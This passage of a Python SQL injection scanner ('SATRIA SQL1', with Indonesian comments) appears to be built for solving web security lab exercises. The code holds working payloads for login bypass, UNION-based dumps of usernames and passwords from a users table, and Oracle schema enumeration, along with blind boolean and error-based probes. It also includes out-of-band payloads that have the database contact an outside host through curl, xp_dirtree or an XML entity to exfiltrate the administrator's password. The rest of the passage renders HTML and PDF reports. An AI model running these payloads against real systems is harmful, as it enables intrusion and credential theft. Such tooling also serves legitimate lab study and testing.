                self._mark(
                    2,
                    f"form login {form.method.upper()} {urlparse(form.action).path or '/'} field `{field}`",
                    "Login dengan kredensial salah ditolak, lalu payload SQLi "
                    f"{payload!r} pada field {field!r} diterima dua kali berturut-turut ({reason2}).",
                    "login bypass differential (dua percobaan)",
                    details={"payload": payload, "field": field, "action": form.action},
                )
                return

    # ------------------------------------------------------ 09/10: other tables
    def detect_union_other_tables(self, points: list[Point]) -> None:
        candidates = [point for point in points if point.kind in ("query", "form")][:6]
        for point in candidates:
            if 9 in self._findings and 10 in self._findings:
                return
            base = self.baseline(point)
            if not base:
                continue
            cols = self.column_count(point)
            if not cols:
                continue
            visible = self.text_columns(point, cols) or list(range(min(cols, 2)))
            if not visible:
                continue
            # 09: dua kolom terpisah -> username, password
            if 9 not in self._findings:
                for user_index in visible:
                    for pass_index in visible:
                        if user_index == pass_index:
                            continue
                        resp = self._union_with(
                            point, cols,
                            {user_index: "username", pass_index: "password"},
                            "FROM users",
                        )
                        pairs = self._extract_pairs(resp, base.first.text)
                        admin = next((pair for pair in pairs if pair[0].lower() == "administrator"), None)
                        if not admin:
                            continue
                        self._mark(
                            9,
                            point.label,
                            f"UNION SELECT username, password FROM users pada kolom {user_index + 1}/{pass_index + 1} "
                            f"mengembalikan administrator dengan password {mask_secret(admin[1])} "
                            f"(jumlah {cols} kolom).",
                            "UNION dua kolom + FROM users (dump kredensial)",
                            details={"columns": cols, "user_column": user_index + 1,
                                     "password_column": pass_index + 1},
                        )
                        break
                    if 9 in self._findings:
                        break
            # 10: beberapa nilai di satu kolom (concatenation)
            if 10 not in self._findings:
                expressions = ("username||'~'||password", "CONCAT(username,'~',password)")
                for index in visible:
                    for expression in expressions:
                        resp = self._union_with(point, cols, {index: expression}, "FROM users")
                        pairs = self._extract_pairs(resp, base.first.text)
                        admin = next((pair for pair in pairs if pair[0].lower() == "administrator"), None)
                        if not admin:
                            continue
                        self._mark(
                            10,
                            point.label,
                            f"UNION SELECT {expression} FROM users pada kolom ke-{index + 1} mengembalikan "
                            f"pasangan administrator~{mask_secret(admin[1])} dalam satu kolom "
                            f"(jumlah {cols} kolom).",
                            "UNION concatenation single-column (dump kredensial)",
                            details={"columns": cols, "column": index + 1, "expression": expression},
                        )
                        break
                    if 10 in self._findings:
                        break

    # ------------------------------------------------------- 06: Oracle listing
    def _oracle_tables(self, point: Point, cols: int, visible: list[int], base: Baseline) -> list[str]:
        found: list[str] = []
        sources = ("all_tables", "user_tables")
        for source in sources:
            for index in visible:
                for expression in ("table_name", "'SATLIST'||table_name"):
                    resp = self._union_with(point, cols, {index: expression}, f"FROM {source}")
                    if resp.error:
                        continue
                    for token in self._new_identifiers(resp.text, base.first.text):
                        upper = token.upper()
                        if not re.fullmatch(r"[A-Z][A-Z0-9_$]{3,39}", upper):
                            continue
                        if not (("_" in upper) or re.search(r"(USER|ACCOUNT|PASS|CRED|MEMBER|ADMIN)", upper)):
                            continue
                        if upper not in found:
                            found.append(upper)
            if found:
                break
        found.sort(key=lambda name: (0 if "USER" in name else 1, len(name)))
        return found

    def _oracle_columns(self, point: Point, cols: int, visible: list[int], table: str, base: Baseline) -> list[str]:
        found: list[str] = []
        for index in visible:
            for expression in ("column_name", "'SCOL'||column_name"):
                for source in ("all_tab_columns", "user_tab_columns"):
                    resp = self._union_with(
                        point, cols, {index: expression},
                        f"FROM {source} WHERE table_name='{table}'",
                    )
                    if resp.error:
                        continue
                    for token in self._new_identifiers(resp.text, base.first.text):
                        upper = token.upper()
                        if not re.fullmatch(r"[A-Z][A-Z0-9_$]{2,39}", upper):
                            continue
                        if not re.search(r"(USER|PASS|PWD|SECRET|EMAIL|LOGIN|ACCOUNT)", upper):
                            continue
                        if upper not in found:
                            found.append(upper)
                    if found:
                        break
                if found:
                    break
            if found:
                break
        return found

    def _oracle_dump(self, point: Point, cols: int, visible: list[int], table: str,
                     user_col: str, pass_col: str, base: Baseline) -> list[tuple[str, str]]:
        pairs: list[tuple[str, str]] = []
        if len(visible) >= 2:
            resp = self._union_with(
                point, cols,
                {visible[0]: user_col, visible[1]: pass_col},
                f"FROM {table}",
            )
            pairs = self._extract_pairs(resp, base.first.text)
        if not pairs:
            for index in visible:
                for expression in (f"{user_col}||'~'||{pass_col}", f"CONCAT({user_col},'~',{pass_col})"):
                    resp = self._union_with(point, cols, {index: expression}, f"FROM {table}")
                    pairs = self._extract_pairs(resp, base.first.text)
                    if pairs:
                        break
                if pairs:
                    break
        return pairs

    def detect_oracle_listing(self, points: list[Point]) -> None:
        candidates = [point for point in points if point.kind in ("query", "form")][:5]
        for point in candidates:
            if 6 in self._findings:
                return
            base = self.baseline(point)
            if not base:
                continue
            cols = self.column_count(point)
            if not cols:
                continue
            visible = self.text_columns(point, cols) or list(range(min(cols, 2)))
            if not visible:
                continue
            tables = self._oracle_tables(point, cols, visible, base)
            if not tables:
                continue
            for table in tables:
                columns = self._oracle_columns(point, cols, visible, table, base)
                user_col = next((name for name in columns if re.search(r"(USER|LOGIN|EMAIL|ACCOUNT)", name)), None)
                pass_col = next((name for name in columns if re.search(r"(PASS|PWD|SECRET)", name)), None)
                if not user_col or not pass_col:
                    continue
                pairs = self._oracle_dump(point, cols, visible, table, user_col, pass_col, base)
                admin = next((pair for pair in pairs if pair[0].lower() == "administrator"), None)
                if not admin:
                    continue
                self._mark(
                    6,
                    point.label,
                    f"Rantai Oracle berhasil pada {point.label}: all_tables -> {table}; "
                    f"all_tab_columns -> {user_col}, {pass_col}; dump -> administrator dengan "
                    f"password {mask_secret(admin[1])} (jumlah {cols} kolom).",
                    "Oracle enumeration chain (all_tables -> all_tab_columns -> dump)",
                    details={"table": table, "user_column": user_col, "password_column": pass_col,
                             "columns": cols},
                )
                return

    # ------------------------------------------------------ 11: blind boolean
    def _blind_candidates(self, points: list[Point]) -> list[Point]:
        cookies = [point for point in points if point.kind == "cookie"][:4]
        others = [point for point in points if point.kind in ("query", "form")][:2]
        return cookies + others

    @staticmethod
    def _boolean_variants(point: Point) -> list[tuple[str, str, str, str]]:
        original = point.original or ""
        if point.numeric:
            return [
                ("numeric_comment", f"{original} AND 1=1-- -", f"{original} AND 1=2-- -",
                 f"{original} AND 2=2-- -"),
                ("numeric_plain", f"{original} AND 1=1", f"{original} AND 1=2",
                 f"{original} AND 2=2"),
            ]
        return [
            ("string_plain", f"{original}' AND '1'='1", f"{original}' AND '1'='2",
             f"{original}' AND '2'='2"),
            ("string_comment", f"{original}' AND '1'='1'-- -", f"{original}' AND '1'='2'-- -",
             f"{original}' AND '2'='2'-- -"),
            ("string_or", f"{original}' OR '1'='1'-- -", f"{original}' OR '1'='2'-- -",
             f"{original}' OR '2'='2'-- -"),
        ]

    def _boolean_probe(self, point: Point, true_value: str, false_value: str,
                       rounds: int = 2) -> dict[str, Any] | None:
        base = self.baseline(point)
        if not base:
            return None
        base_norm = base.first.normalized
        base_grams = grams(base_norm)
        hits = 0
        signature = ""
        true_scores: list[float] = []
        false_scores: list[float] = []
        for index in range(rounds):
            order = (True, False) if index % 2 == 0 else (False, True)
            results: dict[bool, Response] = {}
            for is_true in order:
                resp = self.send(point, true_value if is_true else false_value)
                if resp.error or resp.status is None or resp.status >= 500 or resp.status in (404, 405):
                    return None
                results[is_true] = resp
            true_resp, false_resp = results[True], results[False]
            true_grams = grams(true_resp.normalized)
            false_grams = grams(false_resp.normalized)
            unique_to_true = (base_grams & true_grams) - false_grams
            unique_to_false = (base_grams & false_grams) - true_grams
            true_scores.append(similarity(base_norm, true_resp.normalized))
            false_scores.append(similarity(base_norm, false_resp.normalized))
            if len(unique_to_true) >= 2 and len(unique_to_true) > len(unique_to_false):
                hits += 1
                if not signature:
                    signature = max(unique_to_true, key=len)
        if hits < rounds:
            return None
        return {
            "signature": signature,
            "true_similarity": statistics.median(true_scores),
            "false_similarity": statistics.median(false_scores),
        }

    def detect_blind_conditional(self, points: list[Point]) -> None:
        if 11 in self._findings:
            return
        for point in self._blind_candidates(points):
            for name, true_value, false_value, true_value_2 in self._boolean_variants(point):
                first = self._boolean_probe(point, true_value, false_value, rounds=2)
                if not first:
                    continue
                second = self._boolean_probe(point, true_value_2, false_value, rounds=1)
                if not second:
                    continue
                self._mark(
                    11,
                    point.label,
                    f"Perbandingan boolean konsisten pada {point.label} ({name}): kondisi benar mempertahankan "
                    f"penanda {first['signature']!r}, kondisi salah menghilangkannya "
                    f"(similarity benar={first['true_similarity']:.2f} vs salah={first['false_similarity']:.2f}); "
                    "kondisi benar kedua (2=2) juga kembali normal.",
                    "boolean content differential (3 kondisi, 3 putaran)",
                    details={"variant": name, "signature": first["signature"]},
                )
                return

    # ------------------------------------------------------ 12: blind errors
    def detect_blind_errors(self, points: list[Point]) -> None:
        if 12 in self._findings:
            return
        for point in self._blind_candidates(points):
            base = self.baseline(point)
            if not base or has_sql_error(base.first):
                continue
            for dbms, builder in self._error_builders(point):
                outcome = self._error_probe(point, builder)
                if not outcome:
                    continue
                self._mark(
                    12,
                    point.label,
                    f"Kondisi boolean mengendalikan error SQL pada {point.label} ({dbms}): "
                    f"1=1 dan 2=2 memicu {outcome['sample']!r}, sedangkan 1=2 tidak memicu error "
                    "(dua putaran, baseline bebas error).",
                    "conditional error differential (3 kondisi, 2 putaran)",
                    details={"dbms": dbms, "sample_error": outcome["sample"]},
                )
                return

    def _error_builders(self, point: Point):
        original = point.original or ""
        quote = "" if point.numeric else "'"
        variants = [
            ("oracle",
             lambda cond: f"{original}{quote} AND (SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'-- -"),
            ("mssql",
             lambda cond: f"{original}{quote} AND 1=CASE WHEN ({cond}) THEN 1/0 ELSE 1 END-- -"),
            ("postgresql",
             lambda cond: f"{original}{quote} AND 1=CASE WHEN ({cond}) THEN CAST(1/0 AS int) ELSE 1 END-- -"),
            ("mysql",
             lambda cond: f"{original}{quote} AND (SELECT CASE WHEN ({cond}) THEN 1/0 ELSE 1 END)=1-- -"),
        ]
        return variants

    def _error_probe(self, point: Point, builder) -> dict[str, Any] | None:
        sample = ""
        for cond_true, cond_false in (("1=1", "1=2"), ("2=2", "1=2")):
            true_errors = 0
            false_errors = 0
            for _ in range(2):
                true_resp = self.send(point, builder(cond_true))
                false_resp = self.send(point, builder(cond_false))
                if true_resp.error or false_resp.error:
                    return None
                if true_resp.status is None or false_resp.status is None:
                    return None
                true_broken = has_sql_error(true_resp) or (true_resp.status or 0) >= 500
                false_broken = has_sql_error(false_resp) or (false_resp.status or 0) >= 500
                if true_broken:
                    true_errors += 1
                    sample = sample or error_text(true_resp) or f"HTTP {true_resp.status}"
                if false_broken:
                    false_errors += 1
            if not (true_errors == 2 and false_errors == 0):
                return None
        return {"sample": snippet(sample, 220)} if sample else None

    # --------------------------------------------------- 13: visible error
    def detect_visible_error(self, points: list[Point]) -> None:
        if 13 in self._findings:
            return
        seen: set[str] = set()
        candidates: list[Point] = []
        for point in self._blind_candidates(points) + [p for p in points if p.kind in ("query", "form")]:
            if point.key not in seen:
                seen.add(point.key)
                candidates.append(point)
        for point in candidates[:6]:
            base = self.baseline(point)
            if not base or has_sql_error(base.first):
                continue
            original = point.original or ""
            quote = "" if point.numeric else "'"
            probes = (
                ("postgresql",
                 f"{original}{quote} AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -"),
                ("mssql",
                 f"{original}{quote} AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -"),
                ("oracle",
                 f"{original}{quote} AND 1=CAST((SELECT username FROM users WHERE ROWNUM=1) AS int)-- -"),
                ("oracle_host",
                 f"{original}{quote} AND 1=UTL_INADDR.GET_HOST_NAME((SELECT username FROM users WHERE ROWNUM=1))-- -"),
            )
            for dbms, payload in probes:
                first = self.send(point, payload)
                if first.error or not has_sql_error(first):
                    continue
                body = normalize_text(first.text)
                if "administrator" not in body.lower():
                    continue
                repeat = self.send(point, payload)
                if repeat.error or not has_sql_error(repeat):
                    continue
                if "administrator" not in normalize_text(repeat.text).lower():
                    continue
                self._mark(
                    13,
                    point.label,
                    f"Error SQL yang terlihat pada {point.label} ({dbms}) membawa nilai dari tabel users; "
                    f"payload {snippet(payload, 150)!r} diulang dan tetap memunculkan 'administrator'. "
                    f"Cuplikan error: {snippet(error_text(first), 200)!r}",
                    "visible error-based data disclosure (dua percobaan)",
                    details={"dbms": dbms, "payload": payload, "leaked_value": "administrator"},
                )
                return

    # ------------------------------------------------------------- 16/17: OOB
    def _oob_interaction_payloads(self, point: Point) -> list[str]:
        if not self.oob:
            return []
        token, domain = self.oob.token, self.oob.domain
        original = point.original or ""
        quote = "" if point.numeric else "'"
        if self.oob.kind == "webhook_site":
            host = f"webhook.site/{token}"
            entity = f"http://webhook.site/{token}/"
        else:
            host = f"{token}.{domain}"
            entity = f"http://{token}.{domain}/"
        document = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "{entity}">%remote;]>'
        )
        oracle_expr = f"EXTRACTVALUE(xmltype('{document}'),'/l') FROM dual"
        return [
            f"{original}{quote} UNION SELECT {oracle_expr}-- -",
            f"{original}{quote} UNION SELECT {oracle_expr},NULL-- -",
            f"{original}{quote} UNION SELECT NULL,{oracle_expr}-- -",
            f"{original}{quote} AND (SELECT {oracle_expr}) IS NOT NULL-- -",
            f"{original}{quote}'; EXEC master..xp_dirtree '//{host}/a'-- -",
            f"{original}{quote}'; COPY (SELECT '') TO PROGRAM 'curl http://{host}/'-- -",
            f"{original}{quote} AND LOAD_FILE('\\\\\\\\{host}\\a')-- -",
        ]

    def _oob_exfil_payloads(self, point: Point) -> list[str]:
        if not self.oob:
            return []
        token, domain = self.oob.token, self.oob.domain
        original = point.original or ""
        quote = "" if point.numeric else "'"
        if self.oob.kind == "webhook_site":
            host = f"webhook.site/{token}"
            tail = f"/{token}/"
        else:
            host = f"{token}.{domain}"
            tail = f".{token}.{domain}/"
        prefix_doc = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'
        suffix_doc = f'{tail}">%remote;]>'
        subquery = "(SELECT password FROM users WHERE username='administrator')"
        oracle_expr = f"EXTRACTVALUE(xmltype('{prefix_doc}'||{subquery}||'{suffix_doc}'),'/l') FROM dual"
        return [
            f"{original}{quote} UNION SELECT {oracle_expr}-- -",
            f"{original}{quote} UNION SELECT {oracle_expr},NULL-- -",
            f"{original}{quote} UNION SELECT NULL,{oracle_expr}-- -",
            f"{original}{quote}'; DECLARE @p varchar(1024); SET @p={subquery}; "
            f"EXEC('master..xp_dirtree \"//'+@p+'{tail}a\"')-- -",
            f"{original}{quote}'; COPY (SELECT '') TO PROGRAM 'curl http://'||{subquery}||'{tail}'-- -",
        ]

    @staticmethod
    def _walk_strings(value: Any) -> Iterable[str]:
        if isinstance(value, dict):
            for item in value.values():
                yield from Sql1Scanner._walk_strings(item)
        elif isinstance(value, list):
            for item in value:
                yield from Sql1Scanner._walk_strings(item)
        elif isinstance(value, (str, int, float)):
            yield str(value)

    def _poll_oob(self) -> list[str]:
        if not self.oob or not self.oob.poll_url:
            return []
        deadline = time.monotonic() + self.oob_wait
        while True:
            try:
                resp = requests.get(self.oob.poll_url, timeout=10, headers={"User-Agent": USER_AGENT})
                resp.raise_for_status()
                hits = [
                    text for text in self._walk_strings(resp.json())
                    if self.oob.token in text or self.oob.domain in text
                ]
                if hits:
                    return list(dict.fromkeys(hits))[:20]
            except Exception as exc:
                self.stats["errors"].append(f"OOB poll: {type(exc).__name__}: {str(exc)[:120]}")
            if time.monotonic() >= deadline:
                return []
            time.sleep(2.0)

    def _extract_exfil(self, interactions: list[str]) -> str | None:
        if not self.oob:
            return None
        token, domain = self.oob.token, self.oob.domain
        for text in interactions:
            if token not in text:
                continue
            for match in re.finditer(r"([A-Za-z0-9]{5,60})\." + re.escape(token) + r"\.", text):
                value = match.group(1)
                if value != token and len(value) >= 5:
                    return value
            marker = f"/{token}/"
            if marker in text:
                rest = text.split(marker, 1)[1]
                value = re.split(r"[/?\"' ]", rest, maxsplit=1)[0].strip()
                if value and value != token and len(value) >= 5:
                    return value
        return None

    def detect_oob(self, points: list[Point]) -> None:
        if not self.oob:
            self.stats["notes"].append(
                "Lab 16/17 tidak diuji: collaborator/OOB belum dikonfigurasi "
                "(--oob-domain + --oob-poll-url atau --oob-webhook-site)."
            )
            return
        candidates = self._blind_candidates(points)[:4]
        if not candidates:
            candidates = [Point(key="oob|root", kind="query", label="endpoint utama",
                                url=self.target_url, name="id", original="1", page_url=self.target_url)]
        for point in candidates:
            for payload in self._oob_interaction_payloads(point):
                self.send(point, payload)
            for payload in self._oob_exfil_payloads(point):
                self.send(point, payload)
        interactions = self._poll_oob()
        if not interactions:
            self.stats["notes"].append(
                f"OOB aktif ({self.oob.domain}) tetapi tidak ada interaksi yang tercatat dalam "
                f"{int(self.oob_wait)} detik."
            )
            return
        first = interactions[0]
        self._mark(
            16,
            "cookie/parameter yang diuji untuk interaksi OOB",
            f"Collaborator {self.oob.domain} menerima interaksi unik bertoken {self.oob.token}: "
            f"{snippet(first, 260)}",
            "out-of-band interaction (collaborator polling)",
            severity="medium",
            details={"token": self.oob.token, "interaction": snippet(first, 320)},
        )
        exfil = self._extract_exfil(interactions)
        if exfil:
            self._mark(
                17,
                "subquery password administrator dieksfiltrasi via DNS/HTTP OOB",
                f"Interaksi OOB membawa label data {mask_secret(exfil)} di depan token "
                f"{self.oob.token}; panjang data {len(exfil)} karakter, konsisten dengan hasil "
                "subquery (SELECT password FROM users WHERE username='administrator').",
                "out-of-band data exfiltration (collaborator polling)",
                severity="critical",
                details={"exfil_length": len(exfil), "masked": mask_secret(exfil)},
            )

    # ------------------------------------------------------------------ scan
    def scan(self) -> dict[str, Any]:
        self.crawl()
        self.build_points()
        self.detect_login_bypass()
        self.detect_union_other_tables(self.points)
        self.detect_oracle_listing(self.points)
        self.detect_oob(self.points)
        self.detect_blind_conditional(self.points)
        self.detect_blind_errors(self.points)
        self.detect_visible_error(self.points)
        return self.report()

    def report(self) -> dict[str, Any]:
        labs: list[dict[str, Any]] = []
        for number, title, key, severity in CATALOG9:
            found = self._findings.get(number)
            if found:
                labs.append(dict(found))
                continue
            method = "not tested / insufficient evidence"
            if number in (16, 17) and not self.oob:
                method = "not tested (OOB collaborator tidak dikonfigurasi)"
            labs.append({
                "id": f"sql_injection-{number:02d}",
                "status": "not_confirmed",
                "title": title,
                "method": method,
                "location": "-",
                "evidence": "-",
                "severity": severity,
                "confidence": "none",
            })
        confirmed = [item for item in labs if item["status"] == "confirmed"]
        by_severity = {"critical": 0, "high": 0, "medium": 0}
        for item in confirmed:
            key = str(item.get("severity", "high")).lower()
            by_severity[key if key in by_severity else "high"] += 1
        return {
            "tool": "SATRIA SQL1",
            "version": __version__,
            "target": self.target_url,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "catalog_scope": "only the 9 requested SQL injection labs",
            "summary": {
                "confirmed": len(confirmed),
                "not_confirmed": len(labs) - len(confirmed),
                "total": len(labs),
                "by_severity": by_severity,
            },
            "labs": labs,
            "scan_stats": {
                "pages_fetched": self.stats["pages_fetched"],
                "injection_points": len(self.points),
                "requests": self.request_count,
                "elapsed_seconds": round(time.monotonic() - self.started, 2),
                "oob_status": self.oob_status,
                "notes": self.stats["notes"][:20],
                "errors": self.stats["errors"][:20],
            },
        }


def scan_target(target_url: str, *, authorized: bool = False, allow_private: bool = False,
                max_pages: int = 25, max_points: int = 16, max_requests: int = 900,
                timeout: float = 10.0, oob_domain: str | None = None,
                oob_poll_url: str | None = None, oob_webhook_site: bool = False,
                oob_wait: float = 20.0) -> dict[str, Any]:
    scanner = Sql1Scanner(
        target_url,
        authorized=authorized,
        allow_private=allow_private,
        max_pages=max_pages,
        max_points=max_points,
        max_requests=max_requests,
        timeout=timeout,
        oob_domain=oob_domain,
        oob_poll_url=oob_poll_url,
        oob_webhook_site=oob_webhook_site,
        oob_wait=oob_wait,
    )
    return scanner.scan()


# ---------------------------------------------------------------------------
# Report writers
# ---------------------------------------------------------------------------
def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / "satria_sql1_report.json"
    html_path = output_dir / "satria_sql1_report.html"
    json_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")

    summary = report.get("summary", {})
    rows: list[str] = []
    details: list[str] = []
    for item in report.get("labs", []):
        status = item.get("status", "not_confirmed")
        badge = "confirmed" if status == "confirmed" else "open"
        rows.append(
            "<tr>"
            f"<td class='mono'>{html_module.escape(str(item.get('id', '')))}</td>"
            f"<td><span class='badge {badge}'>{html_module.escape(status)}</span></td>"
            f"<td>{html_module.escape(str(item.get('severity', '')).upper())}</td>"
            f"<td>{html_module.escape(str(item.get('title', '')))}</td>"
            f"<td class='mono small'>{html_module.escape(str(item.get('location', '-'))) }</td>"
            f"<td class='mono small'>{html_module.escape(str(item.get('method', '-'))) }</td>"
            "</tr>"
        )
        if status == "confirmed":
            details.append(
                "<article class='card confirmed'>"
                f"<header><span class='mono'>{html_module.escape(str(item.get('id', '')))}</span>"
                f"<span class='badge confirmed'>confirmed</span></header>"
                f"<h3>{html_module.escape(str(item.get('title', '')))}</h3>"
                f"<p class='meta'>Lokasi: <code>{html_module.escape(str(item.get('location', '-'))) }</code></p>"
                f"<p class='meta'>Metode: {html_module.escape(str(item.get('method', '-'))) }</p>"
                f"<p class='evidence'>{html_module.escape(str(item.get('evidence', '-'))) }</p>"
                "</article>"
            )
    notes = "".join(
        f"<li>{html_module.escape(str(note))}</li>" for note in report.get("scan_stats", {}).get("notes", [])
    )
    html_path.write_text(
        "<!doctype html><html lang='id'><head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<title>SATRIA SQL1 - Laporan 9 Lab</title><style>"
        ":root{--navy:#0f2f47;--teal:#0e7c7b;--ink:#17202b;--muted:#5b6b7c;--line:#dbe5ee;--bg:#f6f9fc;"
        "--green:#0b7a3b;--greenbg:#e3f5e9;--amber:#8a6a00;--amberbg:#fdf6dc}"
        "*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);"
        "font:14px/1.55 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}"
        ".wrap{max-width:1080px;margin:0 auto;padding:0 26px 40px}"
        "header.hero{background:linear-gradient(120deg,var(--navy),#17496b);color:#fff;padding:34px 0 28px;margin-bottom:26px}"
        ".hero h1{margin:0 0 6px;font-size:30px;letter-spacing:.2px}"
        ".hero p{margin:0;color:#cfe0ee}.hero .target{margin-top:12px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px}"
        ".chips{display:flex;gap:10px;flex-wrap:wrap;margin:0 0 22px}"
        ".chip{background:#fff;border:1px solid var(--line);border-radius:10px;padding:12px 16px;min-width:150px}"
        ".chip b{display:block;font-size:24px;line-height:1.1}.chip span{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}"
        "table{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--line);border-radius:10px;overflow:hidden}"
        "th,td{padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top;text-align:left}"
        "th{background:#eef4f9;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#2b455c}"
        "tr:last-child td{border-bottom:0}.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}.small{font-size:12px}"
        ".badge{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11px;font-weight:700;letter-spacing:.04em}"
        ".badge.confirmed{background:var(--greenbg);color:var(--green)}.badge.open{background:var(--amberbg);color:var(--amber)}"
        "h2{margin:32px 0 12px;font-size:19px}.card{background:#fff;border:1px solid var(--line);border-left:4px solid var(--green);"
        "border-radius:10px;padding:14px 16px;margin-bottom:12px}"
        ".card header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;color:var(--muted);font-size:12px}"
        ".card h3{margin:2px 0 8px;font-size:15px}.card .meta{margin:2px 0;color:var(--muted);font-size:12.5px}"
        ".card .evidence{margin:8px 0 0;font-size:13px}"
        "code{background:#eef4f9;padding:1px 5px;border-radius:5px;font-size:12px}"
        "ul.notes{background:#fff;border:1px solid var(--line);border-radius:10px;padding:12px 18px 12px 32px;color:#33475b;font-size:12.5px}"
        "footer{margin-top:30px;color:var(--muted);font-size:11.5px;border-top:1px solid var(--line);padding-top:14px}"
        "</style></head><body>"
        "<header class='hero'><div class='wrap'>"
        "<h1>SATRIA SQL1</h1>"
        "<p>Laporan perbaikan 9 lab SQL injection yang sebelumnya gagal.</p>"
        f"<p class='target'>{html_module.escape(str(report.get('target', '-')))}</p>"
        "</div></header><div class='wrap'>"
        "<div class='chips'>"
        f"<div class='chip'><b>{summary.get('confirmed', 0)}/9</b><span>terkonfirmasi</span></div>"
        f"<div class='chip'><b>{summary.get('not_confirmed', 0)}</b><span>belum terkonfirmasi</span></div>"
        f"<div class='chip'><b>{report.get('scan_stats', {}).get('requests', 0)}</b><span>permintaan HTTP</span></div>"
        f"<div class='chip'><b>{report.get('scan_stats', {}).get('elapsed_seconds', 0)}s</b><span>durasi</span></div>"
        "</div>"
        "<h2>Hasil per lab</h2><table><thead><tr><th>Lab</th><th>Status</th><th>Severity</th>"
        "<th>Judul</th><th>Lokasi</th><th>Metode</th></tr></thead><tbody>"
        f"{''.join(rows)}</tbody></table>"
        f"<h2>Detail bukti ({summary.get('confirmed', 0)})</h2>"
        f"{''.join(details) if details else '<p>Belum ada lab terkonfirmasi pada putaran ini.</p>'}"
        f"<h2>Catatan pemindaian</h2><ul class='notes'>{notes or '<li>Tidak ada catatan.</li>'}</ul>"
        "<footer>Status <b>confirmed</b> hanya diberikan bila bukti diferensial dapat diulang. "
        "Status <b>not_confirmed</b> berarti bukti tidak cukup, bukan klaim target aman. "
        "Lab 16/17 memerlukan collaborator OOB.</footer>"
        "</div></body></html>",
        encoding="utf-8",
    )
    return json_path, html_path


# ---------------------------------------------------------------------------
# PDF (A4, tanpa dependensi eksternal)
# ---------------------------------------------------------------------------
_PDF_W = 595.0
_PDF_H = 842.0
_PDF_MARGIN = 46.0
_PDF_BOTTOM = 52.0
_PDF_TOP = 800.0
_PDF_COLORS = {
    "navy": (0.059, 0.184, 0.278), "teal": (0.055, 0.486, 0.482),
    "text": (0.090, 0.125, 0.169), "muted": (0.357, 0.420, 0.486),
    "line": (0.859, 0.898, 0.933), "light": (0.965, 0.976, 0.988),
    "white": (1.0, 1.0, 1.0), "green": (0.043, 0.478, 0.231),
    "amber": (0.541, 0.416, 0.000),
}


def _pdf_escape(value: Any) -> str:
    safe = ascii_clean(value)
    return safe.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def _pdf_num(value: float) -> str:
    return f"{float(value):.2f}".rstrip("0").rstrip(".")


def _pdf_rgb(rgb: tuple[float, float, float]) -> str:
    return " ".join(_pdf_num(component) for component in rgb)


class _Pdf:
    def __init__(self) -> None:
        self.pages: list[list[str]] = [[]]
        self.ops = self.pages[0]
        self.y = _PDF_TOP

    def new_page(self) -> None:
        self.pages.append([])
        self.ops = self.pages[-1]
        self.y = _PDF_TOP

    def ensure(self, height: float) -> None:
        if self.y - height < _PDF_BOTTOM:
            self.new_page()

    def rect(self, x: float, y: float, width: float, height: float,
             color: tuple[float, float, float]) -> None:
        self.ops.append(
            f"{_pdf_rgb(color)} rg {_pdf_num(x)} {_pdf_num(y)} "
            f"{_pdf_num(width)} {_pdf_num(height)} re f"
        )

    def rect_top(self, x: float, top: float, width: float, height: float,
                 color: tuple[float, float, float]) -> None:
        self.rect(x, top - height, width, height, color)

    def line(self, x1: float, y1: float, x2: float, y2: float,
             color: tuple[float, float, float], width: float = 0.6) -> None:
        self.ops.append(
            f"{_pdf_num(width)} w {_pdf_rgb(color)} RG {_pdf_num(x1)} {_pdf_num(y1)} m "
            f"{_pdf_num(x2)} {_pdf_num(y2)} l S"
        )

    def text(self, x: float, baseline: float, value: Any, size: float = 9.0,
             color: tuple[float, float, float] | None = None, bold: bool = False) -> None:
        font = "/F2" if bold else "/F1"
        self.ops.append(
            f"BT {font} {_pdf_num(size)} Tf {_pdf_rgb(color or _PDF_COLORS['text'])} rg "
            f"{_pdf_num(x)} {_pdf_num(baseline)} Td ({_pdf_escape(value)}) Tj ET"
        )

    @staticmethod
    def wrap(value: Any, width: float, size: float) -> list[str]:
        text = ascii_clean(value) or "-"
        max_chars = max(16, int(width / (size * 0.5)))
        return textwrap.wrap(text, width=max_chars, break_long_words=True,
                             break_on_hyphens=False) or [text]

    def paragraph(self, x: float, width: float, value: Any, size: float = 9.0,
                  color: tuple[float, float, float] | None = None, bold: bool = False,
                  space_before: float = 0.0) -> None:
        self.y -= space_before
        leading = size * 1.4
        for line in self.wrap(value, width, size):
            self.ensure(size)
            self.y -= leading
            self.text(x, self.y, line, size, color, bold)


def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
    """Tulis PDF ringkas A4: ringkasan + tabel 9 lab + detail bukti."""
    target_path = Path(path or OUTPUT_PDF).expanduser()
    if not target_path.is_absolute():
        target_path = (Path.cwd() / target_path).resolve()
    target_path.parent.mkdir(parents=True, exist_ok=True)

    report = result.get("report", result) if isinstance(result.get("report"), dict) else result
    labs = report.get("labs", []) if isinstance(report, dict) else []
    summary = report.get("summary", {}) if isinstance(report, dict) else {}
    stats = report.get("scan_stats", {}) if isinstance(report, dict) else {}
    target = str(report.get("target", result.get("target", "-")))
    generated = str(report.get("generated_at", ""))
    if "T" in generated:
        generated = generated.replace("T", " ").split(".")[0]

    doc = _Pdf()
